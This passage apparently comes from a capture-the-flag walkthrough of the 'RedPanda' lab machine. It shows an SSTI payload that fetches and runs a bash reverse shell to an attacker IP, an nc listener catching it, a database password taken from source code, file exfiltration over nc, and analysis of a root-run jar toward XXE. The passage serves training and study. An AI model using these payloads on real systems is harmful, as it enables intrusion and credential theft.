+<div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  redpanda echo <span class="st">"bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1"</span> <span class="op">&gt;</span> revshell.sh</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">## Request 1 - Upload</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="va">name</span><span class="op">=</span><span class="pp">*</span>{T<span class="kw">(</span><span class="ex">java.lang.Runtime</span><span class="kw">)</span><span class="fu">.getRuntime()</span><span class="ex">.exec</span><span class="er">(</span><span class="st">'wget http://10.10.14.6/revshell.sh'</span><span class="kw">)</span><span class="er">}</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="co">## Request 2 - Execute</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="va">name</span><span class="op">=</span><span class="pp">*</span>{T<span class="kw">(</span><span class="ex">java.lang.Runtime</span><span class="kw">)</span><span class="fu">.getRuntime()</span><span class="ex">.exec</span><span class="er">(</span><span class="st">'bash revshell.sh'</span><span class="kw">)</span><span class="er">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  redpanda nc <span class="at">-lvnp</span> 443 </span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 443 ...</span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.6</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.170]</span> 32894</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="ex">bash:</span> cannot set terminal process group <span class="er">(</span><span class="ex">879</span><span class="kw">)</span><span class="bu">:</span> Inappropriate ioctl for device</span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="ex">bash:</span> no job control in this shell</span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="ex">woodenk@redpanda:/tmp/hsperfdata_woodenk$</span> </span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="ex">woodenk@redpanda:~$</span> cat user.txt</span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="ex">4f591f5aaa56e50ec3bb7ac485cc81c3</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<hr>
+</section>
+</section>
+<section id="root" class="level1">
+<h1>Root</h1>
+<section id="step-1-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
+<ul>
+<li>We’re unable to run <code>sudo -l</code> due to the lack of password</li>
+<li>The directory <code>.ssh</code> doesn’t exist so we can’t steal <code>id_rsa</code> for persistance</li>
+</ul>
+<p>Manually enumerating the box we find the sensitive web files at <code>/opt/panda_search</code>. Digging deeper we find the sql connection including the password for user <code>Woodenk</code>.</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search$</span> cat MainController.java</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">conn</span> = DriverManager.getConnection<span class="er">(</span><span class="st">"jdbc:mysql://localhost:3306/red_panda"</span><span class="ex">,</span> <span class="st">"woodenk"</span>, <span class="st">"RedPandazRule"</span><span class="kw">);</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Looking in the MySQL Server there’s nothing of use however, only pictures of red pandas.</p>
+<p>Before enumerating automatically with linPEAS etc I like to use <code>pspy64</code> to see if there’s anything obvious being executed as root that we can exploit, so lets look at that.</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">woodenk@redpanda:/dev/shm$</span> wget http://10.10.14.6/pspy64</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">woodenk@redpanda:/dev/shm$</span> chmod +x pspy64 </span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ex">woodenk@redpanda:/dev/shm$</span> ./pspy64</span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/08/16</span> 10:36:01 CMD: UID=0    PID=18234  <span class="kw">|</span> <span class="ex">/bin/sh</span> <span class="at">-c</span> /root/run_credits.sh </span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/08/16</span> 10:36:01 CMD: UID=0    PID=18233  <span class="kw">|</span> <span class="ex">/usr/sbin/CRON</span> <span class="at">-f</span> </span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/08/16</span> 10:36:01 CMD: UID=0    PID=18236  <span class="kw">|</span> <span class="ex">java</span> <span class="at">-jar</span> /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar </span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/08/16</span> 10:36:01 CMD: UID=0    PID=18235  <span class="kw">|</span> <span class="ex">/bin/sh</span> /root/run_credits.sh </span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/08/16</span> 10:36:53 CMD: UID=0    PID=18257  <span class="kw">|</span> </span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/08/16</span> 10:38:01 CMD: UID=0    PID=18270  <span class="kw">|</span> <span class="ex">/usr/sbin/CRON</span> <span class="at">-f</span> </span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/08/16</span> 10:38:01 CMD: UID=0    PID=18271  <span class="kw">|</span> <span class="ex">/bin/sh</span> <span class="at">-c</span> /root/run_credits.sh </span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/08/16</span> 10:38:01 CMD: UID=0    PID=18272  <span class="kw">|</span> <span class="ex">/bin/sh</span> /root/run_credits.sh </span>
+<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/08/16</span> 10:38:01 CMD: UID=0    PID=18273  <span class="kw">|</span> <span class="ex">java</span> <span class="at">-jar</span> /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Okay so we see a .jar-file being executed every 2 minutes by root (UID=0), lets download that file and investigate it.</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  redpanda nc <span class="at">-lp</span> 1234 <span class="op">&gt;</span> final-1.0-jar-with-dependencies.jar</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">woodenk@redpanda:/opt/credit-score/LogParser/final/target$</span> nc <span class="at">-w</span> 3 10.10.14.6 1234 <span class="op">&lt;</span> final-1.0-jar-with-dependencies.jar</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="step-2-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
+<p>The jar-file has a lot to unpack and you really need focus to keep your ducks in a row. I use <strong>jd-gui</strong> to open and analyze the jar. Ill try to go through all the requirements, step by step, and what we need to do to pass to code execution through <strong>XXE</strong>.</p>
+<p><strong>Application Code:</strong></p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode java code-with-copy"><code class="sourceCode java"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> App <span class="op">{</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">public</span> <span class="dt">static</span> <span class="bu">Map</span> <span class="fu">parseLog</span><span class="op">(</span><span class="bu">String</span> line<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>    <span class="bu">String</span><span class="op">[]</span> strings <span class="op">=</span> line<span class="op">.</span><span class="fu">split</span><span class="op">(</span><span class="st">"</span><span class="sc">\\</span><span class="st">|</span><span class="sc">\\</span><span class="st">|"</span><span class="op">);</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>    <span class="bu">Map</span><span class="op">&lt;</span><span class="bu">Object</span><span class="op">,</span> <span class="bu">Object</span><span class="op">&gt;</span> map <span class="op">=</span> <span class="kw">new</span> <span class="bu">HashMap</span><span class="op">&lt;&gt;();</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>    map<span class="op">.</span><span class="fu">put</span><span class="op">(</span><span class="st">"status_code"</span><span class="op">,</span> <span class="bu">Integer</span><span class="op">.</span><span class="fu">valueOf</span><span class="op">(</span><span class="bu">Integer</span><span class="op">.</span><span class="fu">parseInt</span><span class="op">(</span>strings<span class="op">[</span><span class="dv">0</span><span class="op">])));</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>    map<span class="op">.</span><span class="fu">put</span><span class="op">(</span><span class="st">"ip"</span><span class="op">,</span> strings<span class="op">[</span><span class="dv">1</span><span class="op">]);</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>    map<span class="op">.</span><span class="fu">put</span><span class="op">(</span><span class="st">"user_agent"</span><span class="op">,</span> strings<span class="op">[</span><span class="dv">2</span><span class="op">]);</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>    map<span class="op">.</span><span class="fu">put</span><span class="op">(</span><span class="st">"uri"</span><span class="op">,</span> strings<span class="op">[</span><span class="dv">3</span><span class="op">]);</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> map<span class="op">;</span></span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a>  </span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a>  <span class="kw">public</span> <span class="dt">static</span> <span class="dt">boolean</span> <span class="fu">isImage</span><span class="op">(</span><span class="bu">String</span> filename<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>filename<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">".jpg"</span><span class="op">))</span></span>
+<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a>      <span class="cf">return</span> <span class="kw">true</span><span class="op">;</span> </span>
+<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="kw">false</span><span class="op">;</span></span>
+<span id="cb10-16"><a href="#cb10-16" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb10-17"><a href="#cb10-17" aria-hidden="true" tabindex="-1"></a>  </span>
+<span id="cb10-18"><a href="#cb10-18" aria-hidden="true" tabindex="-1"></a>  <span class="kw">public</span> <span class="dt">static</span> <span class="bu">String</span> <span class="fu">getArtist</span><span class="op">(</span><span class="bu">String</span> uri<span class="op">)</span> <span class="kw">throws</span> <span class="bu">IOException</span><span class="op">,</span> JpegProcessingException <span class="op">{</span></span>
+<span id="cb10-19"><a href="#cb10-19" aria-hidden="true" tabindex="-1"></a>    <span class="bu">String</span> fullpath <span class="op">=</span> <span class="st">"/opt/panda_search/src/main/resources/static"</span> <span class="op">+</span> uri<span class="op">;</span></span>
+<span id="cb10-20"><a href="#cb10-20" aria-hidden="true" tabindex="-1"></a>    <span class="bu">File</span> jpgFile <span class="op">=</span> <span class="kw">new</span> <span class="bu">File</span><span class="op">(</span>fullpath<span class="op">);</span></span>
+<span id="cb10-21"><a href="#cb10-21" aria-hidden="true" tabindex="-1"></a>    Metadata metadata <span class="op">=</span> JpegMetadataReader<span class="op">.</span><span class="fu">readMetadata</span><span class="op">(</span>jpgFile<span class="op">);</span></span>
+<span id="cb10-22"><a href="#cb10-22" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span>Directory dir <span class="op">:</span> metadata<span class="op">.</span><span class="fu">getDirectories</span><span class="op">())</span> <span class="op">{</span></span>
+<span id="cb10-23"><a href="#cb10-23" aria-hidden="true" tabindex="-1"></a>      <span class="cf">for</span> <span class="op">(</span>Tag tag <span class="op">:</span> dir<span class="op">.</span><span class="fu">getTags</span><span class="op">())</span> <span class="op">{</span></span>
+<span id="cb10-24"><a href="#cb10-24" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>tag<span class="op">.</span><span class="fu">getTagName</span><span class="op">()</span> <span class="op">==</span> <span class="st">"Artist"</span><span class="op">)</span></span>
+<span id="cb10-25"><a href="#cb10-25" aria-hidden="true" tabindex="-1"></a>          <span class="cf">return</span> tag<span class="op">.</span><span class="fu">getDescription</span><span class="op">();</span> </span>
+<span id="cb10-26"><a href="#cb10-26" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span> </span>
+<span id="cb10-27"><a href="#cb10-27" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> </span>
+<span id="cb10-28"><a href="#cb10-28" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="st">"N/A"</span><span class="op">;</span></span>
+<span id="cb10-29"><a href="#cb10-29" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb10-30"><a href="#cb10-30" aria-hidden="true" tabindex="-1"></a>  </span>
+<span id="cb10-31"><a href="#cb10-31" aria-hidden="true" tabindex="-1"></a>  <span class="kw">public</span> <span class="dt">static</span> <span class="dt">void</span> <span class="fu">addViewTo</span><span class="op">(</span><span class="bu">String</span> path<span class="op">,</span> <span class="bu">String</span> uri<span class="op">)</span> <span class="kw">throws</span> JDOMException<span class="op">,</span> <span class="bu">IOException</span> <span class="op">{</span></span>
+<span id="cb10-32"><a href="#cb10-32" aria-hidden="true" tabindex="-1"></a>    SAXBuilder saxBuilder <span class="op">=</span> <span class="kw">new</span> <span class="fu">SAXBuilder</span><span class="op">();</span></span>
+<span id="cb10-33"><a href="#cb10-33" aria-hidden="true" tabindex="-1"></a>    XMLOutputter xmlOutput <span class="op">=</span> <span class="kw">new</span> <span class="fu">XMLOutputter</span><span class="op">();</span></span>
+<span id="cb10-34"><a href="#cb10-34" aria-hidden="true" tabindex="-1"></a>    xmlOutput<span class="op">.</span><span class="fu">setFormat</span><span class="op">(</span><span class="bu">Format</span><span class="op">.</span><span class="fu">getPrettyFormat</span><span class="op">());</span></span>
+<span id="cb10-35"><a href="#cb10-35" aria-hidden="true" tabindex="-1"></a>    <span class="bu">File</span> fd <span class="op">=</span> <span class="kw">new</span> <span class="bu">File</span><span class="op">(</span>path<span class="op">);</span></span>
+<span id="cb10-36"><a href="#cb10-36" aria-hidden="true" tabindex="-1"></a>    <span class="bu">Document</span> doc <span class="op">=</span> saxBuilder<span class="op">.</span><span class="fu">build</span><span class="op">(</span>fd<span class="op">);</span></span>
+<span id="cb10-37"><a href="#cb10-37" aria-hidden="true" tabindex="-1"></a>    <span class="bu">Element</span> rootElement <span class="op">=</span> doc<span class="op">.</span><span class="fu">getRootElement</span><span class="op">();</span></span>
+<span id="cb10-38"><a href="#cb10-38" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span><span class="bu">Element</span> el <span class="op">:</span> rootElement<span class="op">.</span><span class="fu">getChildren</span><span class="op">())</span> <span class="op">{</span></span>
+<span id="cb10-39"><a href="#cb10-39" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span>el<span class="op">.</span><span class="fu">getName</span><span class="op">()</span> <span class="op">==</span> <span class="st">"image"</span><span class="op">)</span></span>
+<span id="cb10-40"><a href="#cb10-40" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>el<span class="op">.</span><span class="fu">getChild</span><span class="op">(</span><span class="st">"uri"</span><span class="op">).</span><span class="fu">getText</span><span class="op">().</span><span class="fu">equals</span><span class="op">(</span>uri<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb10-41"><a href="#cb10-41" aria-hidden="true" tabindex="-1"></a>          <span class="bu">Integer</span> totalviews <span class="op">=</span> <span class="bu">Integer</span><span class="op">.</span><span class="fu">valueOf</span><span class="op">(</span><span class="bu">Integer</span><span class="op">.</span><span class="fu">parseInt</span><span class="op">(</span>rootElement<span class="op">.</span><span class="fu">getChild</span><span class="op">(</span><span class="st">"totalviews"</span><span class="op">).</span><span class="fu">getText</span><span class="op">())</span> <span class="op">+</span> <span class="dv">1</span><span class="op">);</span></span>
+<span id="cb10-42"><a href="#cb10-42" aria-hidden="true" tabindex="-1"></a>          <span class="bu">System</span><span class="op">.</span><span class="fu">out</span><span class="op">.</span><span class="fu">println</span><span class="op">(</span><span class="st">"Total views:"</span> <span class="op">+</span> <span class="bu">Integer</span><span class="op">.</span><span class="fu">toString</span><span class="op">(</span>totalviews<span class="op">.</span><span class="fu">intValue</span><span class="op">()));</span></span>
+<span id="cb10-43"><a href="#cb10-43" aria-hidden="true" tabindex="-1"></a>          rootElement<span class="op">.</span><span class="fu">getChild</span><span class="op">(</span><span class="st">"totalviews"</span><span class="op">).</span><span class="fu">setText</span><span class="op">(</span><span class="bu">Integer</span><span class="op">.</span><span class="fu">toString</span><span class="op">(</span>totalviews<span class="op">.</span><span class="fu">intValue</span><span class="op">()));</span></span>
+<span id="cb10-44"><a href="#cb10-44" aria-hidden="true" tabindex="-1"></a>          <span class="bu">Integer</span> views <span class="op">=</span> <span class="bu">Integer</span><span class="op">.</span><span class="fu">valueOf</span><span class="op">(</span><span class="bu">Integer</span><span class="op">.</span><span class="fu">parseInt</span><span class="op">(</span>el<span class="op">.</span><span class="fu">getChild</span><span class="op">(</span><span class="st">"views"</span><span class="op">).</span><span class="fu">getText</span><span class="op">()));</span></span>
+<span id="cb10-45"><a href="#cb10-45" aria-hidden="true" tabindex="-1"></a>          el<span class="op">.</span><span class="fu">getChild</span><span class="op">(</span><span class="st">"views"</span><span class="op">).</span><span class="fu">setText</span><span class="op">(</span><span class="bu">Integer</span><span class="op">.</span><span class="fu">toString</span><span class="op">(</span>views<span class="op">.</span><span class="fu">intValue</span><span class="op">()</span> <span class="op">+</span> <span class="dv">1</span><span class="op">));</span></span>
+<span id="cb10-46"><a href="#cb10-46" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span>  </span>
+<span id="cb10-47"><a href="#cb10-47" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> </span>
+<span id="cb10-48"><a href="#cb10-48" aria-hidden="true" tabindex="-1"></a>    <span class="bu">BufferedWriter</span> writer <span class="op">=</span> <span class="kw">new</span> <span class="bu">BufferedWriter</span><span class="op">(</span><span class="kw">new</span> <span class="bu">FileWriter</span><span class="op">(</span>fd<span class="op">));</span></span>
+<span id="cb10-49"><a href="#cb10-49" aria-hidden="true" tabindex="-1"></a>    xmlOutput<span class="op">.</span><span class="fu">output</span><span class="op">(</span>doc<span class="op">,</span> writer<span class="op">);</span></span>
+<span id="cb10-50"><a href="#cb10-50" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb10-51"><a href="#cb10-51" aria-hidden="true" tabindex="-1"></a>  </span>
+<span id="cb10-52"><a href="#cb10-52" aria-hidden="true" tabindex="-1"></a>  <span class="kw">public</span> <span class="dt">static</span> <span class="dt">void</span> <span class="fu">main</span><span class="op">(</span><span class="bu">String</span><span class="op">[]</span> args<span class="op">)</span> <span class="kw">throws</span> JDOMException<span class="op">,</span> <span class="bu">IOException</span><span class="op">,</span> JpegProcessingException <span class="op">{</span></span>
+<span id="cb10-53"><a href="#cb10-53" aria-hidden="true" tabindex="-1"></a>    <span class="bu">File</span> log_fd <span class="op">=</span> <span class="kw">new</span> <span class="bu">File</span><span class="op">(</span><span class="st">"/opt/panda_search/redpanda.log"</span><span class="op">);</span></span>
+<span id="cb10-54"><a href="#cb10-54" aria-hidden="true" tabindex="-1"></a>    <span class="bu">Scanner</span> log_reader <span class="op">=</span> <span class="kw">new</span> <span class="bu">Scanner</span><span class="op">(</span>log_fd<span class="op">);</span></span>
+<span id="cb10-55"><a href="#cb10-55" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> <span class="op">(</span>log_reader<span class="op">.</span><span class="fu">hasNextLine</span><span class="op">())</span> <span class="op">{</span></span>
+<span id="cb10-56"><a href="#cb10-56" aria-hidden="true" tabindex="-1"></a>      <span class="bu">String</span> line <span class="op">=</span> log_reader<span class="op">.</span><span class="fu">nextLine</span><span class="op">();</span></span>
+<span id="cb10-57"><a href="#cb10-57" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(!</span><span class="fu">isImage</span><span class="op">(</span>line<span class="op">))</span></span>
+<span id="cb10-58"><a href="#cb10-58" aria-hidden="true" tabindex="-1"></a>        <span class="cf">continue</span><span class="op">;</span> </span>
+<span id="cb10-59"><a href="#cb10-59" aria-hidden="true" tabindex="-1"></a>      <span class="bu">Map</span> parsed_data <span class="op">=</span> <span class="fu">parseLog</span><span class="op">(</span>line<span class="op">);</span></span>
+<span id="cb10-60"><a href="#cb10-60" aria-hidden="true" tabindex="-1"></a>      <span class="bu">System</span><span class="op">.</span><span class="fu">out</span><span class="op">.</span><span class="fu">println</span><span class="op">(</span>parsed_data<span class="op">.</span><span class="fu">get</span><span class="op">(</span><span class="st">"uri"</span><span class="op">));</span></span>
+<span id="cb10-61"><a href="#cb10-61" aria-hidden="true" tabindex="-1"></a>      <span class="bu">String</span> artist <span class="op">=</span> <span class="fu">getArtist</span><span class="op">(</span>parsed_data<span class="op">.</span><span class="fu">get</span><span class="op">(</span><span class="st">"uri"</span><span class="op">).</span><span class="fu">toString</span><span class="op">());</span></span>
+<span id="cb10-62"><a href="#cb10-62" aria-hidden="true" tabindex="-1"></a>      <span class="bu">System</span><span class="op">.</span><span class="fu">out</span><span class="op">.</span><span class="fu">println</span><span class="op">(</span><span class="st">"Artist: "</span> <span class="op">+</span> artist<span class="op">);</span></span>
+<span id="cb10-63"><a href="#cb10-63" aria-hidden="true" tabindex="-1"></a>      <span class="bu">String</span> xmlPath <span class="op">=</span> <span class="st">"/credits/"</span> <span class="op">+</span> artist <span class="op">+</span> <span class="st">"_creds.xml"</span><span class="op">;</span></span>
+<span id="cb10-64"><a href="#cb10-64" aria-hidden="true" tabindex="-1"></a>      <span class="fu">addViewTo</span><span class="op">(</span>xmlPath<span class="op">,</span> parsed_data<span class="op">.</span><span class="fu">get</span><span class="op">(</span><span class="st">"uri"</span><span class="op">).</span><span class="fu">toString</span><span class="op">());</span></span>
+<span id="cb10-65"><a href="#cb10-65" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> </span>
+<span id="cb10-66"><a href="#cb10-66" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb10-67"><a href="#cb10-67" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Starting from main, the jar-file opens <code>/opt/panda_search/redpanda.log</code> and reads the output, line by line, top down. Note that we have read+write over the file as it’s owned by group <code>logs</code>.</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">woodenk@redpanda:/dev/shm$</span> ls <span class="at">-al</span> /opt/panda_search/redpanda.log </span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-rw-r--</span> 1 root logs 280 Aug 16 12:46 /opt/panda_search/redpanda.log</span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="ex">woodenk@redpanda:/dev/shm$</span> id</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">woodenk</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>1001<span class="kw">(</span><span class="ex">logs</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>1001<span class="kw">(</span><span class="ex">logs</span><span class="kw">)</span><span class="ex">,1000</span><span class="er">(</span><span class="ex">woodenk</span><span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><strong>Below are the steps we need to understand:</strong><br> <br>1, Verify that <code>.jpg</code> is present in <code>redpanda.log</code>.<br></p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode java code-with-copy"><code class="sourceCode java"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co">// MAIN</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="bu">File</span> log_fd <span class="op">=</span> <span class="kw">new</span> <span class="bu">File</span><span class="op">(</span><span class="st">"/opt/panda_search/redpanda.log"</span><span class="op">);</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="bu">Scanner</span> log_reader <span class="op">=</span> <span class="kw">new</span> <span class="bu">Scanner</span><span class="op">(</span>log_fd<span class="op">);</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="op">(</span>log_reader<span class="op">.</span><span class="fu">hasNextLine</span><span class="op">())</span> <span class="op">{</span></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>  <span class="bu">String</span> line <span class="op">=</span> log_reader<span class="op">.</span><span class="fu">nextLine</span><span class="op">();</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(!</span><span class="fu">isImage</span><span class="op">(</span>line<span class="op">))</span></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">continue</span><span class="op">;</span> </span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a><span class="co">// isImage</span></span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="dt">static</span> <span class="dt">boolean</span> <span class="fu">isImage</span><span class="op">(</span><span class="bu">String</span> filename<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>filename<span class="op">.</span><span class="fu">contains</span><span class="op">(</span><span class="st">".jpg"</span><span class="op">))</span></span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a>      <span class="cf">return</span> <span class="kw">true</span><span class="op">;</span> </span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="kw">false</span><span class="op">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><br>2, When a line with <code>.jpg</code> is found, send the line to be parsed by function <code>parseLog</code>. <code>parseLog</code> will separate the line and return four callable chunks; (1) <code>status_code</code>, (2) <code>ip</code>, (3) <code>user_agent</code> &amp; (4) <code>uri</code>. Again, note that we can controll the <code>uri</code> parameter as we (group <code>logs</code>) own <code>redpanda.log</code>.</p>
